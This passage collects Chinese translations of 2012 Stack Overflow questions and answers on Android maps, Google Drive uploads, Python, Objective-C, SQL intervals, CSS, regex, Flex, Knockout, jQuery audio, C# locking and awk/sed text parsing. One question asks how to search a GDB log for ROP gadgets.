                public void onClick(DialogInterface dialog, int which) {
                    // TODO Auto-generated method stub

                }
            });
              alert.setNegativeButton("pick address", new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface dialog, int which) {
                        // TODO Auto-generated method stub
                    }
                });
              alert.setNeutralButton("option 3", new DialogInterface.OnClickListener() {

                    public void onClick(DialogInterface dialog, int which) {
                        // TODO Auto-generated method stub

                    }
                });

              alert.create();
              alert.show();
              return true;
          }
            return false;

        }
    }
} 
```

这是 .xml 文件：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

   <com.google.android.maps.MapView
          android:id="@+id/mvMain"
                 android:layout_width="fill_parent"
                 android:layout_height="fill_parent"
                 android:enabled="true"
                 android:clickable="true"
                 android:apiKey="a valid key" />

</RelativeLayout> 
```

和清单：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.natasam.mapstwo"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />
<uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
         android:theme="@android:style/Theme.NoTitleBar">
        <uses-library android:name="com.google.android.maps" />
        <activity
            android:name=".Main"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest> 
```

怎么了？它显示地图但不显示警报对话框...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T00:46:03.143

你是在执行`OnTouchEvent`，不是[`onTouchEvent`](https://developers.google.com/maps/documentation/android/reference/com/google/android/maps/Overlay#onTouchEvent%28android.view.MotionEvent,%20com.google.android.maps.MapView%29)。

试试这个：

```
@Override // Yes, use @Override
public boolean onTouchEvent(MotionEvent e, MapView v){ 
```

一旦你改变了它，使用`android.util.Log.i(...);`or`System.out.println(...);`来确保你的触摸事件甚至被调用。

# google-drive-api - 上传到 Google Drive 中已删除的文件夹不会引发异常

> ID：11751072
> 
> 赞同：2
> 
> 时间：2012-08-01T00:43:28.773
> 
> 标签：google-drive-api

我有一个 Android 应用程序可以上传到 Google Drive 中的一个文件夹。我的那部分工作正常。现在，如果我删除 Google Drive 中的文件夹，然后我的应用程序尝试上传到此文件夹，则上传“成功”，但我在 Google Drive 中找不到该文件。

我希望 Google Drive 会抛出一个异常，但据我所知，事实并非如此。这是设计使然吗？我是否需要在每次上传之前检查该文件夹是否存在，还是有其他方法？

谢谢

这是我正在使用的代码

```
File body = new File();
body.setTitle(title);
body.setDescription(description);
body.setMimeType(mimeType);

// Set the parent folder.
body.setParents(Arrays.asList(new ParentReference().setId(parentId)));

// File's content.
java.io.File fileContent = new java.io.File(filename);
FileContent mediaContent = new FileContent(mimeType, fileContent);

try {
    drive.files().insert(body, mediaContent).execute();
} catch (IOException e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T03:43:40.930

文件插入方法的返回值是插入文件的元数据。您可以使用它来了解有关 Google Drive 上新文件的所有信息，包括它所在的文件夹。

# python - 列表字典中项目的 Python 计数

> ID：11751081
> 
> 赞同：7
> 
> 时间：2012-08-01T00:44:29.083
> 
> 标签：python, list, dictionary

我有一个列表字典，我想为其添加一个值到特定列表中......我有以下列表字典。

```
d = {'a': [4,'Adam', 2], 'b': [3,'John', 4], 'c': [4,'Adam', 3], 'd': [4,'Bill' 3], 'e': [4,'Bob'], 'f': [4, 'Joe'], 'g': [4, 'Bill']} 
```

我想基本上算出名字的数量并返回。所以在这种情况下，它会像

```
Adam: 2
Bill: 2
John: 1
Bob: 1
Joe: 1 
```

为方便起见，所有名称都是列表中的第二个元素或

```
for i in d:
     d[i][1] 
```

知道如何有效地做到这一点吗？我目前只是手动检查每个名称并计算并返回 =/

提前致谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-01T00:52:50.247

[`collections.Counter`](http://docs.python.org/library/collections.html#counter-objects)总是有利于数数。

```
>>> from collections import Counter
>>> d = {'a': [4,'Adam', 2], 'b': [3,'John', 4], 'c': [4,'Adam', 3], 'd': [4,'Bill', 3], 'e': [4,'Bob'], 'f': [4, 'Joe'], 'g': [4, 'Bill']}
>>> # create a list of only the values you want to count,
>>> # and pass to Counter()
>>> c = Counter([values[1] for values in d.itervalues()])
>>> c
Counter({'Adam': 2, 'Bill': 2, 'Bob': 1, 'John': 1, 'Joe': 1}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:32:07.557

```
d = {'key': 'value'}
temp_dict = {}
for key, values in d.items():
    if values[1] in temp_dict:
        temp_dict[values[1]] = temp_dict[values[1]] + 1
    else:
        temp_dict[values[1]] = 1 
```

此代码比上一个答案更长，但它只是产生相同结果的另一种方式。无论如何，`temp_dict`将名称存储为键和值作为它出现的次数。

# objective-c - 变量的范围目标 C

> ID：11751082
> 
> 赞同：4
> 
> 时间：2012-08-01T00:44:40.740
> 
> 标签：objective-c, xcode, variables, properties, scope

方法调用完成后，方法中声明的变量会被删除吗？即，如果我有方法“someMethod”并且每次调用它时我想从堆栈属性返回不同的 NSString，该方法将返回堆栈上的下一个对象，还是会保持返回第一个索引，因为 x 在方法调用结束。我知道在函数调用后是否会删除 C 中的变量，在目标 c 中是否相同？对变量 x 使用单独的属性会出现这个问题吗？谢谢

```
(Double) someMethod{
int x;
[self.stack objectAtIndex:x];
x++;
} 
```

阅读评论后，我尝试创建一个属性来替换 x，这就是我写的内容，但我收到一条错误警告，指出““_location”的本地声明隐藏实例变量”这是什么意思？

```
@property (nonatomic) int location;
@synthesize location=_location;

-(int) location{
    if(!_location){
        int _location = 0;
     //warning is here 
    return _location;
     }
_location++;
return _location;

}

 (Double) someMethod{
int x;
[self.stack objectAtIndex:self.location];
x++;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T00:47:09.330

> 方法调用完成后，方法中声明的变量会被删除吗？

是的

目标 C 方法是在 C 函数的“顶部”实现的，因此适用相同的规则。特别是，您的代码表现出未定义的行为（读取未初始化的变量）。

要解决此问题，请添加一个实例变量`x`来代替您的代码片段当前声明 的*自动变量。*

* * *

*自动*是“堆栈”变量的“官方”名称，即您在方法/函数中声明的变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T00:46:55.470

*是的，局部变量的生命周期仅限于封闭函数的执行时间（ blocks*除外，但在这种情况下您没有使用它们）。

如果您`x`想在调用`someMethod`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T03:03:15.823

回答您有关警告的问题...

这只是说当您在方法 location() 中声明时

```
int _location = 0; 
```

此局部变量与您之前创建的属性同名

```
@syntenshize location = _location 
```

因此（对于程序员来说）知道他现在使用的是哪一个会变得很困惑。

编译器将理解 if _location 内部是一个 int ...，而 if _location 外部是您的属性。

# excel - Com 互操作：迭代列而不是行

> ID：11751084
> 
> 赞同：0
> 
> 时间：2012-08-01T00:44:54.677
> 
> 标签：excel, com-interop, excel-interop

我一定错过了痛苦的显而易见的事情，但我不明白为什么这段代码会遍历一行的列而不是向下遍历一列的行：

```
// ws = Excel worksheet
for (int i = 2; i <= ws.UsedRange.Rows.Count; i++)
{
    Range range = ws.Cells[i][2];
    if (!range.Value2.ToString().Equals("Unknown"))
    {
        int count = Convert.ToInt32(range.Value2.ToString());
        if (count >= 3)
        {
            Range chronic = ws.Rows[i];
            chronic.EntireRow.Cells.Interior.Color = 0xFF0000;
        }
    }
} 
```

这会遍历第 2 行的列，而不是向下遍历所有行的第 2 列。任何建议表示赞赏。

问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T14:59:28.257

`Cells[i][2]`应该`Cells[i,2]`

# sql - 如何在 postgresql 中获取平均时间

> ID：11751086
> 
> 赞同：0
> 
> 时间：2012-08-01T00:45:15.143
> 
> 标签：sql, postgresql, intervals, average

我有这样的表：

```
name   number   total_time    avg_time
tom      10      00:02:28        ?
kevin    6       09:22:25        ? 
```

total_time 是间隔类型，我可以轻松更改为字符串。现在，我想像这样获得 avg_time

```
avg_time = total_time / number; 
```

我徘徊如何得到结果？我尝试计算天，小时，分钟，秒，但这太难了，谁能给我一些建议？多谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T00:54:28.230

希望这个例子（基于你的）是有帮助的：

```
postgres=# SELECT *, total_time / number AS avg_time 
    FROM (SELECT INTERVAL '00:02:28' AS total_time, 10 AS number) a;
 total_time | number |  avg_time  
------------+--------+------------
 00:02:28   |     10 | 00:00:14.8
(1 row) 
```

您能否更具体地说明其中的哪一部分不适合您？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T00:53:45.550

不知道对不对，随便用/就可以了，像这样

```
select interval '02:00:00'/4 
```

我得到了正确的答案，所以问题可能很简单

```
select total_time / number 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-16T18:56:34.867

下面使用纪元时间并且工作完美（18000是纪元的开始）

```
select to_timestamp(avg(18000 + 
                        cast(extract(epoch from badge_in_time::time) as integer)
                       )
                   )::time as Avg_Badge_in 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-07-04T11:00:32.097

您还可以使用`avg`运算符： `select name, avg(total_time) from table group by name;`

# linux - 在 GDB 日志中查找文本

> ID：11751088
> 
> 赞同：0
> 
> 时间：2012-08-01T00:45:36.797
> 
> 标签：linux, gdb

我将 GDB 中的一些数据记录到文件 gdb.txt 中，如下所示：

```
 0x00fca0ab:    pop    ebp
    0x00fca0ac:    dec    edx
    0x00fca0ad:    xlat   BYTE PTR ds:[ebx]
    0x00fca0ae:    jmp    0xb31bbe76
    0x00fca0b3:    mov    bl,0x8a
    0x00fca0b5:    fmul   DWORD PTR [edi+0x21828f9b]
    0x00fca0bb:    mov    BYTE PTR [ebp+0x45],ah
    0x00fca0be:    adc    BYTE PTR ds:0x66e7d2ad,ch
    0x00fca0c4:    xchg   edx,eax 
```

我想搜索特定的 ROP 小工具，所以我会寻找类似的东西：

```
 [address]:    xchg   esi,eax
    [address]:    ret 
```

我将如何去搜索这样的文本？我将不得不查看特定的列，那么最好的方法是什么？顺便说一句，这是 Ubuntu 11.10。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T00:50:42.540

尝试这个：

```
awk '{print $2}' gdb.txt #it prints the second column in the file 
```

然后您可以使用 grep 查找所需的数据。总共：

```
awk '{print $2}' gdb.txt | grep data 
```

# html - 如何从我的 inline-block 元素中删除这个白色背景

> ID：11751090
> 
> 赞同：1
> 
> 时间：2012-08-01T00:45:47.030
> 
> 标签：html, css, layout

我有以下 html/css 代码：

## HTML

```
<div id="statusSteps">
    <span class="step complete">step 1</span>
    <span class="step complete">step 2</span>
    <span class="step complete">step 3</span>
    <span class="step">step 4</span>
    <span class="step">step 5</span>
</div>​ 
```

## CSS

```
#statusSteps {
    display: inline-block;
    border: 1px solid black;
    padding: 0px;
    margin: 0px;
}

.step {
    display: inline-block;
    text-align: center;
    border-right: 1px solid black;
    padding: 0px 15px;
    font-weight:bold;
}

.step:last-child {
    border-right: none;
}

.complete {
    background-color: LightGray;
}​ 
```

我创建了一个 JSFiddle 来玩它：http: [//jsfiddle.net/wMShU/](http://jsfiddle.net/wMShU/)

在我尝试过的浏览器（Firefox、IE9 和 Chrome）中，步骤 1 和步骤 2 的左侧有一个白色区域。

有没有人知道一个干净的方法让那些灰色背景的步骤填满整个区域？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T00:50:35.123

添加`float: left;`到`.step`课堂。我已经添加`float: left`并编辑了你的 jsfiddle：http: [//jsfiddle.net/wMShU/1/](http://jsfiddle.net/wMShU/1/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T00:57:57.777

Miljan Puzović 的解决方案有效，但是您可以`display: inline-block`完全删除（浮动元素都是隐式的`display: block`）。

您的问题的原因是`inline-block`元素受标记上的空白影响。如果您删除`<span>`标签之间的空白（这*会使*您的代码看起来很难看），空白边距就会消失。

见[演示](http://jsfiddle.net/wMShU/2/)。

# c# - 创建正则表达式时遇到问题

> ID：11751095
> 
> 赞同：1
> 
> 时间：2012-08-01T00:46:39.580
> 
> 标签：c#, regex

我正在尝试创建一个将接受某种命令格式的正则表达式。模式如下：

可以以 $ 开头并具有以下两个值 0-9、AF、af（即：$00 - $FF）或可以是除 "&<>'/" 之外的任何值

*如果值以 $ 开头，接下来的两个值需要是从 00-ff 的有效十六进制值

到目前为止我有这个

```
Regex correctValue = new Regex("($[0-9a-fA-F][0-9a-fA-F])"); 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:08:19.237

您只需要在“$”之前添加“\”符号即可：

```
 string input = "$00";

        Match m = Regex.Match(input, @"^\$[0-9a-fA-F][0-9a-fA-F]$");
        if (m.Success)
        {
            foreach (Group g in m.Groups)
                Console.WriteLine(g.Value);
        }
        else
            Console.WriteLine("Didn't match"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T01:07:30.057

如果我正确地关注了您，那么您正在寻找的最终结果是任何不在列表“&<>'/”中的值，因为 $ 和两个字母数字字符的任何组合也不会在该列表中。因此，您可以表达：

```
Regex correctValue = new Regex("[^&<>'/]"); 
```

更新：但是以防万一您确实需要知道如何正确匹配 $00 - $FF，这可以解决问题：

```
Regex correctValue = new Regex("\$[0-9A-Fa-f]{2}"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T04:25:43.010

在正则表达式`$`中用于**Anchor assertion**，并且意味着：

> 匹配必须出现在字符串的末尾或行或字符串末尾的 \n 之前。

尝试使用`[$]`(Character Class for single character) 或`\$`(Character Escape) 代替。

# actionscript-3 - Flex/AS3：从 ListCollectionView 中删除项目

> ID：11751096
> 
> 赞同：1
> 
> 时间：2012-08-01T00:46:45.413
> 
> 标签：actionscript-3, apache-flex

我使用了一个临时数组来填充 ListCollectionView。稍后，我有一个屏幕显示使用 ListCollectionView 作为 dataProvider 的 DataGrid。用户可以通过选择行然后单击删除按钮来删除 DataGrid 中的行。

如何访问 ListCollectionView 使用的原始源，并从那里删除该项目？

在我这样做之后，该项目是否也会自动从 ListCollectionView 中删除，并且不再显示在 DataGrid 中（或者是否需要刷新某些内容）？

更新 1

以下听起来像我在正确的轨道上吗？（我想从 ListCollectionView 的源（是“.list”吗？）中删除它，而不仅仅是从 ListCollectionView 中删除。）

```
[Bindable] private var _myLCV:ListCollectionView=new ListCollectionView(new ArrayList());
...
var obj:Object = _myLCV.getItemAt(myGrid.grid.selectedIndex); // get item user selected
_myLCV.list.removeItemAt( _myLCV.list.getItemIndex(obj) );   // delete item from source 
```

更新 2

我不确定为什么（我使用的是 SDK 4.5.1A），但我似乎需要在 UPDATE 1 中的上述代码中添加以下代码行，以便 DataGrid 可靠地更新并显示已删除的行：

```
_myLCV.refresh(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T00:57:21.923

我的冲动是建议使用[removeItemAt](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/ListCollectionView.html#removeItemAt%28%29)从 ListCollectionView 中删除该项目。

如果您真的想访问源而不是处理集合，那么这取决于您使用的 ListCollectionView 的类型。

如果您使用的是 ArrayCollection，则可以使用[source 属性](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/ArrayCollection.html#source)访问源。如果您使用的是 XMLListCollection，则可以使用[source 属性](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/XMLListCollection.html#source)访问源。

ListCollectionView 中没有固有的源属性，但[List 属性](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/ListCollectionView.html#list)可能就足够了。

在任何情况下，从 ListCollectionView 或 ListCollectionView 的源中删除项目应该会自动更新 DataGrid。如果没有，您可以在集合上调用[refresh() 方法。](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/ListCollectionView.html#refresh%28%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:44:42.613

Spark DataGrid 与其他列表基础控件（例如 List 甚至 DataGroup）一样，会从其 dataProvider 观察更改事件。更改事件可能包括项目移除、更新、排序和插入。这提供了通过仅更新其基础数据来更新控件的便利。

也就是说，如果您的意图是“刷新”数据网格以与 LIstCollectionView 保持同步，那么通过修改数组然后刷新将是不必要的。

# knockout.js - 我需要帮助使用 Knockout 格式化数据绑定

> ID：11751103
> 
> 赞同：5
> 
> 时间：2012-08-01T00:48:02.427
> 
> 标签：knockout.js

我对 Knockout 相当陌生，我正在寻找格式化输出的方法。我看到了一个类似这样的例子，但我的尝试当然没有奏效。

这是 jsfiddle 的链接：http: [//jsfiddle.net/cezmp/](http://jsfiddle.net/cezmp/)

```
<div id="VMDiv">    
<table>
   <thead>
      <tr>
         <th>Raw</th>
         <th>Formatted</th>
      </tr>
   </thead>
   <tbody>
       <tr>
          <td data-bind="text : SomeData "> </td>
          <td data-bind="text : formatPercent(SomeData())"> </td>
       </tr>
    </tbody>
</table>
</div>

<script type="text/javascript">
    function formatPercent(value) {
        return value.toFixed(2) + "%";
    }

    function vm() {
        var self = this;
        self.SomeData = ko.observable(62.1795972898);
    }

    ko.applyBindings(new vm(), document.getElementById("VMDiv"));
</script> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-01T00:54:45.503

您可以考虑使用计算的 observable：

```
div id="VMDiv">    
<table>
 <thead>
  <tr>
     <th>Raw</th>
     <th>Formatted</th>
  </tr>
 </thead>
 <tbody>
   <tr>
      <td data-bind="text : SomeData "> </td>
      <td data-bind="text : SomeDataFormatted"> </td>
   </tr>
 </tbody>
</table>
</div>

<script type="text/javascript">
    function vm() {
        var self = this;
        self.SomeData = ko.observable(62.1795972898);
        self.SomeDataFormatted = ko.computed(function(){
            return self.SomeData().toFixed(2) + "%";
        });
    }

    ko.applyBindings(new vm(), document.getElementById("VMDiv"));
</script> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-01T07:58:08.740

如果你想要一个更通用的解决方案，你可以做这样的事情

```
(function () {

    ko.extenders.isCurrency = function (target, options) {
        var result = ko.dependentObservable({
            read: function () {
                return Globalize.format(target(), "c");
            },
            write: target
        });

        result.raw = target;
        return result;
    };
} ());

ViewModel = function() {
    this.cashIsKing = ko.observable(565345.56435535).extend({ isCurrency: true});
};

ko.applyBindings(new ViewModel()); 
```

[http://jsfiddle.net/5H5AK/](http://jsfiddle.net/5H5AK/)

编辑：您可以提供带有选项的对象文字并使用 isCurrency 扩展器中的选项，而不是使用 true 作为选项

# jquery - jQuery IE，如何停止 元素

> ID：11751106
> 
> 赞同：5
> 
> 时间：2012-08-01T00:48:20.807
> 
> 标签：jquery, html

我目前正在尝试在我的网站上播放不同的 wav 文件。我目前正在使用 HTML5`<audio>`元素，但我也在尝试获得一些向后兼容性，因为 IE 不会通过音频标签播放 wav。

我创建了一个创建适当声音`<embed>`对象的 javascript 函数：

```
function createPreHtml5EmbedItem(callID, parent) {
            $("#sound").remove();
            var sound = $("<embed id='sound' controls='console' type='audio/wav' />");
            sound.attr('src', '/recording?id=' + callID);
            sound.attr('loop', false);
            sound.attr('hidden', false);
            sound.attr('autostart', true);
            parent.append(sound);
} 
```

这一切都很好，但是当我点击不同的按钮时，我想停止播放这个音频元素。在 Firefox 中，我可以这样做：

```
function stopAudioPreHtml5() {
    $("#sound").remove();
} 
```

但由于某种原因，这在 IE 中不起作用。有没有办法`<embed>`在我删除它之前停止当前正在播放的元素？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-09T03:26:18.447

对于 IE，你可以使用`.stop()`方法来阻止它。

***[演示。](http://jsfiddle.net/Ugqyc/3/)***

```
function stopAudioPreHtml5() {
    var sound = $("#sound");
    if ($.browser.msie) {
       sound[0].stop();
    }
    sound.remove();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:52:35.990

也许把你的声音文件放在一个 iframe 中，然后用 jquery 删除整个 iframe？！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T23:00:27.830

当我有一个与 javascript 变量名相同的元素时，我在 IE 中遇到了问题。

在这种情况下，您的变量`sound`和您使用 id 创建的元素`sound`

在创建对象并将所有属性添加到对象时，我会尝试使用不同的变量名，例如

```
var soundIE = $("<embed id='sound' controls='console' type='audio/wav' />");

soundIE.attr('src', '/recording?id=' + callID);
soundIE.attr('loop', false);
soundIE.attr('hidden', false);
soundIE.attr('autostart', true);
$(parent).append(soundIE); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-15T12:31:18.097

```
function createPreHtml5EmbedItem(callID, parent) {
            $("#sound").remove();
            var sound = $("<embed id='sound' controls='console' type='audio/wav' />");
            sound.attr('src', '/recording?id=' + callID);
            sound.attr('loop', false);
            sound.attr('hidden', false);
            sound.attr('autostart', true);
            $(parent).append(sound);
} 
```

更改了附加行，对我来说效果很好。顺便说一句，如果您使用 .stop() 并且页面上有这么多的嵌入对象，则会导致性能问题。但 remove() 不会。

# c# - 锁定语句饱和

> ID：11751108
> 
> 赞同：1
> 
> 时间：2012-08-01T00:48:23.257
> 
> 标签：c#, multithreading, locking

我有这个代码：

```
class Program
{
    static void Main(string[] args)
    {
        TestClass instanceOfClass = new TestClass();
        while (true)
        {
            Thread threadTest = new Thread(new ParameterizedThreadStart(AddNewToClass));
            threadTest.Start(instanceOfClass);
        }
    }
    static void AddNewToClass(object parameter)
    {
        var instance = (TestClass)parameter;
        while (true)
        {
            if (instance.Contains(1))
            {
                continue;
            }
            else
            {
                instance.AddNew(1);
            }
        }
    }
}

class TestClass
{
    public Dictionary<int, string> dictionary;
    public TestClass()
    {
        dictionary = new Dictionary<int, string>();
    }
    public void AddNew(int test)
    {
        lock (dictionary)
        {
            dictionary.Add(test, "Test string");
        }
    }
    public bool Contains(int test)
    {
        lock (dictionary)
        {
            if (dictionary.ContainsKey(test))
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
} 
```

我想做的是有几个不同的线程从字典中添加/删除对象。我试着运行它，我得到了这个异常：

> 已添加具有相同密钥的项目。

这似乎非常奇怪。据我所知，lock 语句应该阻塞有问题的字典，并且 TestClass.Contains(1) 应该**总是**返回 true，并且它抛出一个异常，因为它不止一次返回 true（因此是异常）。

任何人都知道为什么会发生这种情况？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T00:56:17.033

你的`Contains()`方法是原子的。你的`Add()`方法也是。`AddNewToClass()`，然而，不是。一个线程可能会从`Contains()`...得到结果，但不能保证它何时可能会或可能不会被暂停（或恢复）。

那是你的比赛条件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T00:54:48.640

你的锁只保护它周围的块 - 正是这个需要保护

```
static void AddNewToClass(object parameter)
    {
        var instance = (TestClass)parameter;
        while (true)
        {
            if (instance.Contains(1))
            {
                continue;
            }  
            else
            {
                instance.AddNew(1);
            }
        }
    } 
```

在 the`if (instance.Contains(1))`和 the之间`instance.AddNew(1);`你可以被抢占。

如果你带着类似的东西去`instance.AddItemIfMissing(1);`

```
public void AddItemIfMissing(int test)
{
    lock (dictionary)
    {
        if (!dictionary.ContainsKey(test))
        {
           dictionary.Add(test, "Test string");
        }
    }
} 
```

这会做你想要的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T00:58:31.533

你有一个赛车条件。锁定后，您需要再次检查字典是否已经包含相同键的项目，因为另一个线程可能在您获得锁定之前添加了它。但为什么要重新发明轮子呢？Parallel Extensions 库中有许多帮助类，例如 ConcurrentBag。或者使用经过深思熟虑的单例模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T00:58:18.513

```
static void AddNewToClass(object parameter)
{
    var instance = (TestClass)parameter;
    while (true)
    {
        if (instance.Contains(1))
        {
            continue;
        }    // **thread switch maybe happens here will cause your problem** 
        else
        {
            instance.AddNew(1);
        }
    }
} 
```

所以跟随更好

```
 lock(instance)
    {
        if (instance.Contains(1))
        {
            continue;
        }    // **thread switch maybe happens here will cause your problem** 
        else
        {
            instance.AddNew(1);
        }
    } 
```

# linux - 使用 linux 从文本文件中选择性地解析注释和值

> ID：11751110
> 
> 赞同：0
> 
> 时间：2012-08-01T00:48:35.920
> 
> 标签：linux, parsing, shell

我想在一些名称块的顶部解析一个带有名称和注释的文件。如果我有这样的文件：

```
Art
Boat
Road
Tree
Street

# Blah
Star
Car
Sun

Sock

# Comm1
# Comm2
Stop
Stick
# Comm
Stock
Dock 
```

我想以某种方式解析这个文件，以便提取所有以“S”开头的名称及其相应的注释。对应的注释是紧接在前面的注释块（一行或多行注释），直到在它前面遇到一个空格。一个注释块也适用于它后面的所有条目，直到遇到空格或另一个注释块。所以上述输入的输出应该是这样的：

```
**Name      Comments**

Street
Star        # Blah
Sun         # Blah
Sock
Stop        # Comm1 # Comm2
Stick       # Comm1 # Comm2
Stock       # Comm 
```

任何人都可以提出一个很好的方法来做到这一点（最好使用shell）？真的很感激。谢谢！

PS：如果我的描述不清楚，我很抱歉，这还是新的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:01:51.157

这是一些有点不雅的 awk 可以完成这项工作：

```
awk '/^$/ {ca=""; cp=""} /^#/ {ca=ca " " $0} /^S/ && ca {cp=ca; ca=""} /^S/ {print $0 " " cp}' < input.txt > output.txt 
```

有两个存储：注释累加器`ca`和注释打印缓冲区`cp`。

1.  每当遇到空行时，两者都被清除。
2.  当遇到注释行时，它被添加到注释累加器中。
3.  当遇到以 S 开头的行并且注释累加器有内容时，注释打印缓冲区被设置为注释累加器中的任何内容，并且后者被清除。
4.  当遇到以 S 开头的行时，将打印它，然后是注释打印缓冲区中的任何内容。

可能有一种更优雅的方法可以做到这一点，这无疑有问题（例如，在行尾放置一个空格而没有评论），但它会让你开始。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T22:38:35.700

假设您的空白行不包含空格：

```
sed -n '/^#/H; /^S/{G; y/\n/ /; p}; /^$/h' input 
```

第一个命令 ( `/^#/H`) 将当前行（注释）附加到保留空间。下一个命令将保留空间（包含所有累积的注释）附加到当前缓冲区，用一个空格替换所有换行符，然后打印该行。每当遇到空行时，最后一个命令都会清除保留空间。

编辑（感谢blahdiblah）

当检测到没有前面空行的新注释块时，上述内容不会正确重置累加器。这很丑陋，但说明了这一点：

```
sed -n '/^#/{h; bk}; :j /^S/{G; y/\n/ /; p}; /^$/h; d; :k n; /^#/{ H; bk}; bj;' input 
```

# javascript - 从 ul 中删除 li 元素

> ID：11751111
> 
> 赞同：7
> 
> 时间：2012-08-01T00:48:48.153
> 
> 标签：javascript, jquery, html, html-lists

考虑到 li 元素的 id，是否可以使用 JavaScript 从 ul 中动态删除几个 li 元素？

关于实际问题的更新：

我有以下清单。

```
<ul id="attributes" data-role="listview">
    <li id="attrib01">Attribute1</li>
    <li id="attrib02">Attribute2</li>
    <li id="attrib03">Attribute3</li>
    <li id="attrib04">Attribute4</li>
    <li id="attrib05">Attribute5</li>
</ul> 
```

在 ajax 请求/响应之后，如果特定属性是“未定义”，我想将其从列表中删除。

```
if(typeof data.attrib1 === "undefined")
    $("#attrib01").remove(); 
```

我已经确定我收到了正确的 ajax 响应。所以，现在的问题是，当我删除 attrib4 时，attrib[1-3] 也被删除了。知道为什么会发生这种情况吗？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-01T00:51:26.033

尝试

```
var elem = document.getElementById('id');
elem.parentNode.removeChild(elem); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-01T00:51:31.200

如果你得到元素然后找到它的父元素然后删除元素。从父母如下：

```
element = document.getElementById("element-id");
element.parentNode.removeChild(element); 
```

有必要通过父母，所以这是不可避免的。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-01T01:34:53.707

`$('#id').remove()`是删除单个元素的正确方法。请注意，元素 ID 在 html 中必须是唯一的，并且该调用必须包装在 DOM 就绪函数中。

[这是一个](http://jsfiddle.net/wXJzc/1/)基于您的 html 的工作示例。它遍历所有列表项并删除其 id 不存在于数据对象中的项：

```
var data = {
    attrib01: "Number 1",
    attrib02: "Number 2",
    attrib04: "Number 4"
};

$(document).ready(function() {
    $("ul > li").each(function() {
        alert(this.id in data); //check if value is defined
        if(!(this.id in data)) {
            $(this).remove();
            // This also works:
            //$('#'+this.id).remove();
        }            
    });
});​ 
```

只需执行以下操作，也可以仅定位和删除单个元素（[Demo](http://jsfiddle.net/wXJzc/2/)）：

```
$(document).ready(function() {
    $("#attrib04").remove();
});​ 
```

请注意您的 ID - 它们必须完全匹配。`attrib04 != attrib4`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T00:51:17.980

这将使`li`元素不可见：

```
document.getElementById("id_here").style.visibility = "hidden"; 
```

免责声明：它们仍将在 DOM 中

要从 DOM 中删除元素，请使用 JQuery 的`.remove()`方法：

```
$("#id_here").remove(); 
```

[http://api.jquery.com/remove/](http://api.jquery.com/remove/)

# node.js - layout.ejs 不适用于 Heroku 中的 NodeJS 应用程序

> ID：11751114
> 
> 赞同：3
> 
> 时间：2012-08-01T00:49:22.257
> 
> 标签：node.js, heroku, express, ejs

我有通常的 nodejs express 应用程序...

```
var express = require('express');

var app = express.createServer(
    express.bodyParser()
);

app.configure( function () {
    app.set('views', __dirname + '/views');
    app.set('view engine', 'ejs');
